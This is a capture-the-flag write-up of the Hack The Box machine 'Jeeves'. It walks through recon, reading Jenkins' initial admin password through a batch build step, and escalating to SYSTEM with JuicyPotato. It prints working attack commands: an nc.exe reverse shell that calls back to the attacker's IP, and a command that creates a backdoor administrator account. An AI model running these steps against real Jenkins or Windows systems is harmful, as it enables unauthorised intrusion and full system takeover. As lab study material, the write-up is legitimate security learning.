---
{"dg-publish":true,"permalink":"/ct-fs/htb/jeeves/","dgShowFileTree":true,"dg-note-properties":{}}
---

#windows #jenkins #unintended #juicypotato #data_stream 


## Recon
![Pasted image 20260916143310.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260916143310.png)

### Nmap:
```zsh
------------------------------------------------------------
Enter your target IP address or URL here: 10.129.228.112
------------------------------------------------------------
Scanning target 10.129.228.112
Time started: 2026-09-16 17:32:49.220123
------------------------------------------------------------
Port 80 is open
Port 135 is open
Port 445 is open
Port 50000 is open
Port scan completed in 0:01:40.566566
------------------------------------------------------------
Threader3000 recommends the following Nmap scan:
************************************************************
nmap -p80,135,445,50000 -sV -sC -T4 -Pn -oA 10.129.228.112 10.129.228.112
************************************************************
Would you like to run Nmap or quit to terminal?
------------------------------------------------------------
1 = Run suggested Nmap scan
2 = Run another Threader3000 scan
3 = Exit to terminal
------------------------------------------------------------
Option Selection: 1
nmap -p80,135,445,50000 -sV -sC -T4 -Pn -oA 10.129.228.112 10.129.228.112
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-16 17:34 -0400
Nmap scan report for 10.129.228.112
Host is up (0.088s latency).

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Ask Jeeves
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
|_http-title: Error 404 Not Found
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: 5h00m02s, deviation: 0s, median: 5h00m01s
| smb2-time: 
|   date: 2026-09-17T02:34:45
|_  start_date: 2026-09-17T02:31:33

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.47 seconds
------------------------------------------------------------
Combined scan completed in 0:02:32.702273
```
Initial portscan shows MSRPC and Domain Services plus two webservers: an IIS server runing on 80 and a Jetty server running on 50000. Let's do some manual enumeration of each web server.
### Port 80 (IIS)
#### Manual Enumeration
```html
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/scanning]
└─$ curl -v http://10.129.228.112
*   Trying 10.129.228.112:80...
* Established connection to 10.129.228.112 (10.129.228.112 port 80) from 10.10.14.89 port 50620 
* using HTTP/1.x
> GET / HTTP/1.1
> Host: 10.129.228.112
> User-Agent: curl/8.21.0
> Accept: */*
> 
* Request completely sent off
< HTTP/1.1 200 OK
< Content-Type: text/html
< Last-Modified: Mon, 06 Nov 2017 02:34:40 GMT
< Accept-Ranges: bytes
< ETag: "2277f7cba756d31:0"
< Server: Microsoft-IIS/10.0
< Date: Thu, 17 Sep 2026 02:38:57 GMT
< Content-Length: 503
< 
<!DOCTYPE html>
<html>
<head>
<title>Ask Jeeves</title>
<link rel="stylesheet" type="text/css" href="style.css">
</head>

<body>
<form class="form-wrapper cf" action="error.html">
    <div class="byline"><p><a href="#">Web</a>, <a href="#">images</a>, <a href="#">news</a>, and <a href="#">lots of answers</a>.</p></div>
  	<input type="text" placeholder="Search here..." required>
	  <button type="submit">Search</button>
    <div class="byline-bot">Skins</div>
</form>
</body>

* Connection #0 to host 10.129.228.112:80 left intact
</html>
```
![Pasted image 20260916144406.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260916144406.png)
Visiting the site it appears to be an old Ask Jeeves search engine site. I've entered "new york" as a search term to see it's behavior.

![Pasted image 20260916144529.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260916144529.png)
It redirects us to `/error.html?` which appears to be a verbose SQL error. We can try to enumerate this for a sql injection. Upon closer inspection it's a png of the error.

### Directory Bruteforcing
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/scanning]
└─$ feroxbuster -u http://jeeves.htb:50000/ -x php,html,txt,js,css,asp,aspx,aspc -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -o ferox_jetty  
                                                                                                                                                                                                                                            
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://jeeves.htb:50000/
 🚩  In-Scope Url          │ jeeves.htb
 🚀  Threads               │ 20
 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💾  Output File           │ ferox_jetty
 💲  Extensions            │ [php, html, txt, js, css, asp, aspx, aspc]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET       11l       26w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves => http://jeeves.htb:50000/askjeeves/
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/search => http://jeeves.htb:50000/askjeeves/search/
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/about => http://jeeves.htb:50000/askjeeves/about/
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/security => http://jeeves.htb:50000/askjeeves/security/
500      GET       93l      598w    15433c http://jeeves.htb:50000/askjeeves/main
404      GET       14l      263w     7119c http://jeeves.htb:50000/askjeeves/search/index
200      GET       16l     1562w    48440c http://jeeves.htb:50000/askjeeves/about/index
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/projects => http://jeeves.htb:50000/askjeeves/projects/
405      GET        4l       13w      207c http://jeeves.htb:50000/askjeeves/cancelQuietDown
200      GET       16l      502w    11087c http://jeeves.htb:50000/askjeeves/safeRestart
200      GET        1l        4w      539c http://jeeves.htb:50000/askjeeves/api/json
200      GET        1l        4w      539c http://jeeves.htb:50000/askjeeves/api/python
405      GET        4l       13w      201c http://jeeves.htb:50000/askjeeves/quietDown
200      GET        1l        8w      659c http://jeeves.htb:50000/askjeeves/api/xml
405      GET        4l       13w      202c http://jeeves.htb:50000/askjeeves/createItem
200      GET       16l      492w    11015c http://jeeves.htb:50000/askjeeves/restart
200      GET      394l     1050w    18730c http://jeeves.htb:50000/askjeeves/api/schema
200      GET        1l        2w       43c http://jeeves.htb:50000/askjeeves/queue/api/xml
200      GET        1l        1w       65c http://jeeves.htb:50000/askjeeves/queue/api/python
200      GET        1l        1w       65c http://jeeves.htb:50000/askjeeves/queue/api/json
200      GET        1l        1w      236c http://jeeves.htb:50000/askjeeves/overallLoad/api/python
200      GET       52l      119w     2328c http://jeeves.htb:50000/askjeeves/queue/api/schema
200      GET      113l      355w     5023c http://jeeves.htb:50000/askjeeves/overallLoad/api/schema
200      GET        1l        1w      236c http://jeeves.htb:50000/askjeeves/overallLoad/api/json
200      GET        1l        2w      406c http://jeeves.htb:50000/askjeeves/overallLoad/api/xml
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/people => http://jeeves.htb:50000/askjeeves/people/
200      GET       14l      482w    10942c http://jeeves.htb:50000/askjeeves/people/index
200      GET        1l        1w      171c http://jeeves.htb:50000/askjeeves/people/api/json
200      GET        1l        1w      171c http://jeeves.htb:50000/askjeeves/people/api/python
200      GET        1l        2w      174c http://jeeves.htb:50000/askjeeves/people/api/xml
200      GET      179l      455w     9033c http://jeeves.htb:50000/askjeeves/people/api/schema
404      GET       16l      266w     7098c http://jeeves.htb:50000/askjeeves/signup
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/asynchPeople => http://jeeves.htb:50000/askjeeves/asynchPeople/
200      GET        1l        1w      184c http://jeeves.htb:50000/askjeeves/asynchPeople/api/json
200      GET        1l        2w      187c http://jeeves.htb:50000/askjeeves/asynchPeople/api/xml
200      GET       75l      685w    14515c http://jeeves.htb:50000/askjeeves/asynchPeople/index
200      GET      179l      455w     9059c http://jeeves.htb:50000/askjeeves/asynchPeople/api/schema
200      GET        1l        1w      184c http://jeeves.htb:50000/askjeeves/asynchPeople/api/python
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/version => http://jeeves.htb:50000/askjeeves/version/
302      GET        0l        0w        0c http://jeeves.htb:50000/askjeeves/assets => http://jeeves.htb:50000/askjeeves/assets/
404      GET        0l        0w        0c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
405      GET        4l       13w      218c http://jeeves.htb:50000/askjeeves/log/newLogRecorder
200      GET       16l      410w     9432c http://jeeves.htb:50000/askjeeves/log/new
200      GET      113l      949w    23144c http://jeeves.htb:50000/askjeeves/log/all
200      GET       19l      449w    10067c http://jeeves.htb:50000/askjeeves/log/levels
200      GET       16l      445w     9831c http://jeeves.htb:50000/askjeeves/log/index
200      GET      124l      650w    16860c http://jeeves.htb:50000/askjeeves/log/rss
404      GET       14l      269w     7253c http://jeeves.htb:50000/askjeeves/log/search/index
405      GET        4l       13w      205c http://jeeves.htb:50000/askjeeves/computer/createItem
200      GET       35l      581w    12276c http://jeeves.htb:50000/askjeeves/computer/new
405      GET        4l       13w      204c http://jeeves.htb:50000/askjeeves/computer/updateNow
200      GET       22l      772w    17104c http://jeeves.htb:50000/askjeeves/computer/configure
200      GET       18l      564w    11838c http://jeeves.htb:50000/askjeeves/computer/index
200      GET       16l      469w    10782c http://jeeves.htb:50000/askjeeves/computers/0/index
404      GET       14l      269w     7280c http://jeeves.htb:50000/askjeeves/computer/search/index
200      GET        1l       17w      237c http://jeeves.htb:50000/askjeeves/log/feeds
403      GET        8l       10w      589c http://jeeves.htb:50000/askjeeves/me
200      GET       14l      470w    10642c http://jeeves.htb:50000/askjeeves/computers/00/markOffline
200      GET        1l        1w       13c http://jeeves.htb:50000/askjeeves/timeline/data
200      GET       16l      469w    10786c http://jeeves.htb:50000/askjeeves/computers/00/index
200      GET      159l      469w     7530c http://jeeves.htb:50000/askjeeves/computer/api/schema
200      GET        3l       13w       71c http://jeeves.htb:50000/askjeeves/robots.txt
🚨 Caught ctrl+c 🚨 saving scan state to ferox-http_jeeves_htb_50000_-1789677529.state ...
[>-------------------] - 48m   838742/83379240 7d      found:61      errors:4899   
[####>---------------] - 48m   398925/1984914 138/s   http://jeeves.htb:50000/ 
[>-------------------] - 18m    18045/1984914 16/s    http://jeeves.htb:50000/askjeeves/ 
[>-------------------] - 18m    17109/1984914 16/s    http://jeeves.htb:50000/askjeeves/search/ 
[>-------------------] - 18m    16956/1984914 16/s    http://jeeves.htb:50000/askjeeves/about/ 
[>-------------------] - 18m    17163/1984914 16/s    http://jeeves.htb:50000/askjeeves/security/ 
[####################] - 3s   1984914/1984914 770840/s http://jeeves.htb:50000/askjeeves/api/ => Directory listing (add --scan-dir-listings to scan)
[>-------------------] - 18m    17793/1984914 17/s    http://jeeves.htb:50000/askjeeves/projects/ 
[####################] - 1s   1984914/1984914 2313420/s http://jeeves.htb:50000/askjeeves/queue/api/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 1s   1984914/1984914 2276278/s http://jeeves.htb:50000/askjeeves/overallLoad/api/ => Directory listing (add --scan-dir-listings to scan)
[>-------------------] - 18m    16344/1984914 16/s    http://jeeves.htb:50000/askjeeves/people/ 
[####################] - 1s   1984914/1984914 2581163/s http://jeeves.htb:50000/askjeeves/people/api/ => Directory listing (add --scan-dir-listings to scan)
[>-------------------] - 17m    16083/1984914 15/s    http://jeeves.htb:50000/askjeeves/asynchPeople/ 
[####################] - 1s   1984914/1984914 2450511/s http://jeeves.htb:50000/askjeeves/asynchPeople/api/ => Directory listing (add --scan-dir-listings to scan)
[>-------------------] - 17m    15894/1984914 15/s    http://jeeves.htb:50000/askjeeves/version/ 
[>-------------------] - 17m    15399/1984914 15/s    http://jeeves.htb:50000/askjeeves/assets/ 
[>-------------------] - 17m    15453/1984914 15/s    http://jeeves.htb:50000/askjeeves/people/users/ 
[>-------------------] - 17m    13662/1984914 14/s    http://jeeves.htb:50000/askjeeves/columns/ 
[>-------------------] - 17m    13149/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/1/ 
[>-------------------] - 17m    13140/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/01/ 
[>-------------------] - 17m    12870/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/06/ 
[>-------------------] - 17m    13266/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/2/ 
[>-------------------] - 17m    12726/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/05/ 
[>-------------------] - 16m    12852/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/04/ 
[>-------------------] - 16m    12852/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/03/ 
[>-------------------] - 16m    13041/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/02/ 
[>-------------------] - 16m    12933/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/3/ 
[>-------------------] - 16m    13068/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/4/ 
[>-------------------] - 16m    12384/1984914 13/s    http://jeeves.htb:50000/askjeeves/computers/ 
[>-------------------] - 16m    12537/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/5/ 
[>-------------------] - 16m    12789/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/6/ 
[>-------------------] - 16m    12177/1984914 13/s    http://jeeves.htb:50000/askjeeves/columns/0/ 
[>-------------------] - 16m    12006/1984914 12/s    http://jeeves.htb:50000/askjeeves/log/ 
[>-------------------] - 16m    11943/1984914 12/s    http://jeeves.htb:50000/askjeeves/log/search/ 
[>-------------------] - 16m    11376/1984914 12/s    http://jeeves.htb:50000/askjeeves/computer/ 
[>-------------------] - 16m    11295/1984914 12/s    http://jeeves.htb:50000/askjeeves/computers/0/ 
[>-------------------] - 16m    11475/1984914 12/s    http://jeeves.htb:50000/askjeeves/computer/search/ 
[>-------------------] - 13m     7956/1984914 10/s    http://jeeves.htb:50000/askjeeves/channel/ 
[>-------------------] - 12m     7578/1984914 10/s    http://jeeves.htb:50000/askjeeves/timeline/ 
[>-------------------] - 12m     7164/1984914 10/s    http://jeeves.htb:50000/askjeeves/columns/00/ 
[>-------------------] - 11m     6390/1984914 9/s     http://jeeves.htb:50000/askjeeves/items/ 
[>-------------------] - 11m     6597/1984914 10/s    http://jeeves.htb:50000/askjeeves/url/ 
[>-------------------] - 11m     5823/1984914 9/s     http://jeeves.htb:50000/askjeeves/computers/00/ 
[>-------------------] - 7m      3006/1984914 7/s     http://jeeves.htb:50000/askjeeves/lookup/ 
[####################] - 10s  1984914/1984914 193537/s http://jeeves.htb:50000/askjeeves/computer/api/ => Directory listing (add --scan-dir-listings to scan)     
```
After a long time scanning the jetty server we finally pop a subdirectory in `feroxbuster` for `/askjeeves/` which appears to be a file listing for an api. See [[CTFs/HTB/Jeeves#Initial Access (Jenkins)\|#Initial Access (Jenkins)]] for more details.

### Port 445 (SMB)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/scanning]
└─$ nxc smb jeeves.htb -u '' -p '' --shares
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\: STATUS_ACCESS_DENIED 
SMB         10.129.228.112  445    JEEVES           [-] Error enumerating shares: Error occurs while reading from remote(104)
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/scanning]
└─$ nxc smb jeeves.htb -u 'Guest' -p '' --shares
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [-] Jeeves\Guest: STATUS_ACCOUNT_DISABLED
```
Checking for null and Guest SMB access on the machine. Also reveals it's running `Windows 10 Pro 10586` and that it's hostname is JEEVES on domain Jeeves.


## Initial Access (Jenkins)
![Pasted image 20260917135355.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917135355.png)
Visting this subdir we see the dashboard for a `jenkins` server which is an automation server that can do various tasks through "projects". You can see I've already made my project TEST to begin studying it's behavior for any possible avenues of exploit. 

![Pasted image 20260917135602.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917135602.png)
Checking out the Users page we can see the `admin` user and the `anonymous` user which the system created for us to mark our session when we created our test project. I found through a Stack Pointer [article](https://stackoverflow.com/questions/46840692/default-credentials-for-jenkins-after-installation) the file location for the Jenkins initial default password for the `admin` user which is found at: `$JENKINS_HOME/secrets/initialAdminPassword`. 

![Pasted image 20260917135951.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917135951.png)
Whenever you create a new Jenkins project you can pick a "freestyle" project that will allow you to add "build steps" which have various options but the one that caught my eye was `Execute Windows Batch command`. Since we understand this machine to be running Windows 10 this means we might have remote code cmd execution on our target here. So I input the `type` command with our known path for the initial admin password to see if we can get it to output it to us directly.

![Pasted image 20260917140238.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917140238.png)
Once you save the config, you click "Build Now" and Jenkins attempts to compile and execute your command(s). As you can see it failed for our command a couple of times before I figured it out.

![Pasted image 20260917140354.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917140354.png)
I then select "Console Output" to see what the cmd session gave to stdout or to our screen directly. As you can see from our first two builds that it says our syntax is incorrect.

![Pasted image 20260917140511.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917140511.png)
I realized that the server probably didn't accept our linux style pathing and set it to the absolute path that we learned from our first two build fails. Setting it to `C:\Users\Administrator\.jenkins\secrets\initialAdminPassword` and we successfully read out the password for `admin:ccd3bc435b3c4f80bea8acca28aec491`

![Pasted image 20260917140718.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917140718.png)
As you can see, we successfully authenticate to the Jenkins server as the admin user. We also note from the output that this server executes commands as the Administrator user on the machine. However, the instance seems to be stored in the AppData folder for the `kohsuke` user.

![Pasted image 20260917140938.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917140938.png)
![Pasted image 20260917141002.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917141002.png)
With those things in mind, I tried to read out `root.txt` directly to see if the jenkins server actually has read access as `Administrator`, but it appears it doesn't. This means our session context is likely owned by `kohsuke`.

![Pasted image 20260917141559.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917141559.png)
As we suspect we are able to read out `user.txt` proving our session belongs to `kohsuke`.

![Pasted image 20260917142443.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917142443.png)
```zsh
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/files]
└─$ python3 -m http.server 8090
Serving HTTP on 0.0.0.0 port 8090 (http://0.0.0.0:8090/) ...
10.129.228.112 - - [17/Sep/2026 17:24:19] "GET /nc.exe HTTP/1.1" 200 -

```
Our next step is to try and get an active shell on the machine. We host a simple python http server in our attacker directory that has a copy of `nc.exe` which is the netcat binary for windows. As you can see, we successfully upload it to `kohsuke's` Desktop.

![Pasted image 20260917142845.png](/img/user/CTFs/HTB/Images/Jeeves%20Images/Pasted%20image%2020260917142845.png)
Then we set our Jenkins command to call out to the newly uploaded `nc` binary and call back to a listener executing `cmd.exe` which should spawn an interactive shell on our listener.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/files]
└─$ nc -lnvp 8888 
listening on [any] 8888 ...
connect to [10.10.14.89] from (UNKNOWN) [10.129.228.112] 49677
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Users\Administrator\.jenkins\workspace\admin test>whoami
whoami
jeeves\kohsuke


```
We hit save and then build now and we successfully catch the callback to our listener as `kohsuke`. 

## Privilege Escalation
### privilege enumeration
```zsh
C:\Users\Administrator\.jenkins\workspace\admin test>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeShutdownPrivilege           Shut down the system                      Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeUndockPrivilege             Remove computer from docking station      Disabled
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
SeTimeZonePrivilege           Change the time zone                      Disabled
```
Checking out our privileges as `kohsuke` we see a pretty standard set except for `SeImpersonatePrivilege` and `SeCreateGlobalPrivilege` which allows us to impersonate other users on the system as well as create global objects. This may be a candidate for a potato style attack.

```zsh
C:\Users\kohsuke>.\jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123 /add && net localgroup administrators hacker /add" -t *
.\jp.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c net user hacker Password123 /add && net localgroup administrators hacker /add" -t *
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

C:\Users\kohsuke>net user
net user

User accounts for \\JEEVES

-------------------------------------------------------------------------------
Administrator            DefaultAccount           Guest                    
hacker                   kohsuke                  
The command completed successfully.
```
After some research we find that this is indeed susceptible to the [JuicyPotato](https://github.com/ohpe/juicy-potato) attack. We download the binary release, upload it to our victim and have it create a new local user called `hacker` added to the administrators group. As you can see, we successfully do so.

```zsh
┌──(kali㉿kali)-[~/CTF/HTB/jeeves/files]
└─$ nxc smb jeeves.htb -u 'hacker' -p 'Password123'   
SMB         10.129.228.112  445    JEEVES           [*] Windows 10 Pro 10586 x64 (name:JEEVES) (domain:Jeeves) (signing:False) (SMBv1:True)
SMB         10.129.228.112  445    JEEVES           [+] Jeeves\hacker:Password123
```
successfully confirm our user is live and the creds are good on our target for user `hacker`.

```zsh
C:\Users\kohsuke>jp.exe -t * -l 1337 -p "cmd.exe" -a "/c c:\Users\kohsuke\Desktop\nc.exe -e cmd.exe 10.10.14.89 4545"
jp.exe -t * -l 1337 -p "cmd.exe" -a "/c c:\Users\kohsuke\Desktop\nc.exe -e cmd.exe 10.10.14.89 4545"
Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

┌──(kali㉿kali)-[~/CTF/HTB/jeeves/files]
└─$ nc -lnvp 4545
listening on [any] 4545 ...
connect to [10.10.14.89] from (UNKNOWN) [10.129.228.112] 49759
Microsoft Windows [Version 10.0.10586]
(c) 2015 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```
 After much trial-and-error we learn that there is no viable pathway to actually login with our new `hacker` user because `runas` finishes the execution instead of allowing us to enter a password and no shell services are active on this machine. Instead we think to use our `nc.exe` binary from before. We setup a listener on our machine and call it within the juicypotato context via `cmd.exe /c <NC path> -e cmd.exe 10.10.14.89 4545` as our command and arg strings. As you can see we successfully catch a reverse shell as `NT AUTHORITY\SYSTEM`. pwned.
 
```zsh
 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,589,503,488 bytes free

C:\Users\Administrator\Desktop>type hm.txt
type hm.txt
The flag is elsewhere.  Look deeper.
C:\Users\Administrator\Desktop>
```
The creator of this box thinks themselves a comedian. The flag is elsewhere.

```zsh
C:\Users\Administrator\Desktop>dir /R
dir /R
 Volume in drive C has no label.
 Volume Serial Number is 71A1-6FA1

 Directory of C:\Users\Administrator\Desktop

11/08/2017  10:05 AM    <DIR>          .
11/08/2017  10:05 AM    <DIR>          ..
12/24/2017  03:51 AM                36 hm.txt
                                    34 hm.txt:root.txt:$DATA
11/08/2017  10:05 AM               797 Windows 10 Update Assistant.lnk
               2 File(s)            833 bytes
               2 Dir(s)   2,589,503,488 bytes free

C:\Users\Administrator\Desktop>powershell Get-Content -Path "hm.txt" -Stream "root.txt"
powershell Get-Content -Path "hm.txt" -Stream "root.txt"
<FLAG VALUE>
```
After much searching to no avail I broke down and referenced the walkthrough (even though we already pwned the box -.-) and found that we need to be searching for alternate data streams of the file. So we use `dir /R` inside `Administrator's` Desktop folder and it reveals an alternate data stream of our original `hm.txt` that's tied to the root flag. We use a powershell oneliner to read out the alt stream and get the root flag...finally

## Final Thoughts 
>[!Takeaways]
>- enumerate things to hell even if the scan goes for a long time (thanks ctfs)
>- remember syntax is king when hacking various OS distros
>- read up more on potato attacks and the Privilege abuses related
>- add "alternate data streams" to your windows privesc workflow with `dir /R`

